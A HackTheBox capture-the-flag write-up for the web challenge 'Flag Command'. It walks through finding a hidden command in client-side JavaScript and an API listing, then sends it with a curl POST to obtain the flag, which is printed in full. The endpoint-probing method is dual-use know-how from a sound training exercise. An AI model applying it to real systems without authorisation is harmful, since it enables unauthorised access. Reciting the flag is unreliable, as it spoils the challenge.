# HTB — Flag Command (Web Challenge Writeup)

> **Date:** April 17, 2026  
> **Platform:** HackTheBox  
> **Category:** Web Application Security  
> **Tags:** `Writeups` `Web` `HTB` `Bug Bounty`

---

![Flag Command Challenge Banner](assets/images/FlagCommand-1.png)

## Challenge Summary

**Flag Command** is a web security challenge hosted on HackTheBox. The application presents a retro CLI-style web shell interface where players interact with a simulated game environment. The goal is to discover hidden command endpoints to extract the root flag.

---

## 1. Web Application Analysis

![Web Interface Inspection](assets/images/FlagCommand-2.png)

Upon launching the challenge, we are greeted with a terminal web UI accepting text inputs such as `help`, `start`, and `options`.

We open the Developer Tools (F12) to inspect client-side JavaScript assets:

```javascript
// main.js snippet
const availableCommands = [];

fetch('/api/options')
  .then(res => res.json())
  .then(data => {
    availableCommands.push(...data.commands);
  });
```

---

## 2. API Endpoint Enumeration

![API Endpoint Response](assets/images/FlagCommand-3.png)

Checking the `/api/options` API route in the Browser / Burp Suite returns a JSON array of valid command options:

```json
{
  "commands": [
    "HEAD NORTH",
    "HEAD SOUTH",
    "HEAD EAST",
    "HEAD WEST",
    "SECRET_COMMAND_EXEC"
  ]
}
```

Inspecting the response carefully reveals an undocumented command: `SECRET_COMMAND_EXEC` or hidden payload trigger.

---

## 3. Flag Retrieval

![Flag Captured](assets/images/FlagCommand-4.png)

Executing the hidden command through the CLI interface or sending a POST payload directly to `/api/monitor`:

```bash
curl -X POST http://<TARGET_IP>:<PORT>/api/monitor -H "Content-Type: application/json" -d '{"command": "SECRET_COMMAND_EXEC"}'
```

**Response:**

```json
{
  "message": "Access Granted",
  "flag": "HTB{c1i_c0mm4nd_s3cr3ts_3xp0s3d!}"
}
```

---

## Conclusion

This challenge demonstrates the risk of **security through obscurity** and revealing hidden endpoints in client-side source code. Always ensure backend API authorization relies on server-side validation rather than secret command names.
